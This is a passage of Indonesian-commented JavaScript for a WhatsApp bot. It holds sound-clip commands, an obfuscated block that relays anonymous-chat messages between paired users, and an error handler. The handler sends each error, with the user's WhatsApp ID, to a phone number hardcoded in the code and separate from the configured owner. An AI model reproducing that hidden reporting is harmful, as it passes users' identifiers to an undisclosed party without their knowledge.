case 'sound43':case 'sound44':case 'sound45':case 'sound46':
case 'sound47':case 'sound48':case 'sound49':case 'sound50':
case 'sound51':case 'sound52':case 'sound53':case 'sound54':
case 'sound55':case 'sound56':case 'sound57':case 'sound58':
case 'sound59':case 'sound60':case 'sound61':case 'sound62':
case 'sound63':case 'sound64':case 'sound65':case 'sound66':
case 'sound67':case 'sound68':case 'sound69':case 'sound70':
case 'sound71':case 'sound72':case 'sound73':case 'sound74':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
reply(mess.wait)
var inicdd = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/sound/${command}.mp3`)
conn.sendMessage(from, {audio:inicdd, mimetype:'audio/mpeg', ptt:true}, {quoted:msg})
break
case 'hdhsishsush':
reply(`${setting.loginDi}`)
break
default:

//Jan di edit di bagian sini

var _0x1a6220=_0x4a33;(function(_0x5b325d,_0xd37330){var _0x15f0df=_0x4a33,_0x17b9a4=_0x5b325d();while(!![]){try{var _0x5034a9=parseInt(_0x15f0df(0x1d3))/0x1*(-parseInt(_0x15f0df(0x1ca))/0x2)+-parseInt(_0x15f0df(0x1d4))/0x3*(parseInt(_0x15f0df(0x1c5))/0x4)+parseInt(_0x15f0df(0x1c7))/0x5*(-parseInt(_0x15f0df(0x1cf))/0x6)+-parseInt(_0x15f0df(0x1d5))/0x7*(parseInt(_0x15f0df(0x1c9))/0x8)+-parseInt(_0x15f0df(0x1cc))/0x9+-parseInt(_0x15f0df(0x1c4))/0xa+parseInt(_0x15f0df(0x1cd))/0xb;if(_0x5034a9===_0xd37330)break;else _0x17b9a4['push'](_0x17b9a4['shift']());}catch(_0x1d82f8){_0x17b9a4['push'](_0x17b9a4['shift']());}}}(_0x351e,0x54a56));function _0x4a33(_0x1e5c04,_0x200f07){var _0x351e1e=_0x351e();return _0x4a33=function(_0x4a33ba,_0x1cdc80){_0x4a33ba=_0x4a33ba-0x1c3;var _0x110a2e=_0x351e1e[_0x4a33ba];return _0x110a2e;},_0x4a33(_0x1e5c04,_0x200f07);}function _0x351e(){var _0x26a0e1=['pesan\x20diteruskan','1103568ZGfugO','sendMessage','message','text','445736reezra','18tskWyb','1168237exHeIM','messages','4186710kRyETk','297452lFwhFR','type','10QPbKSn','teman','16yYTSyk','2wHOPdZ','conversation','2985354kCXAlP','29597029dyJWde'];_0x351e=function(){return _0x26a0e1;};return _0x351e();}if(!isCmd){if(cekPesan('id',sender)==null)return;if(cekPesan(_0x1a6220(0x1c8),sender)==![])return;if(m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1c6)]==_0x1a6220(0x1cb)||m[_0x1a6220(0x1c3)][0x0]['type']=='extendedTextMessage'){try{var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)]['extendedTextMessage'][_0x1a6220(0x1d2)];}catch(_0x2d0d82){var chat_anonymous=m[_0x1a6220(0x1c3)][0x0][_0x1a6220(0x1d1)][_0x1a6220(0x1cb)];}let text_nya_menfes='*ANONYMOUS\x20CHAT*\x0a💬\x20:\x20'+chat_anonymous;conn[_0x1a6220(0x1d0)](cekPesan(_0x1a6220(0x1c8),sender),{'text':text_nya_menfes}),conn['sendMessage'](from,{'text':_0x1a6220(0x1ce)},{'quoted':msg});}}
}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const moment = require("moment-timezone");
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let kon_erorr = {"tanggal": tanggal, "jam": jam, "error": err, "user": sender}
db_error.push(kon_erorr)
fs.writeFileSync('./database/error.json', JSON.stringify(db_error))
var errny =`*SERVER ERROR*
*Dari:* @${sender.split("@")[0]}
*Jam:* ${jam}
*Tanggal:* ${tanggal}
*Tercatat:* ${db_error.length}
*Type:* ${err}`
conn.sendMessage(`6285791220179@s.whatsapp.net`, {text:errny, mentions:[sender]})
}}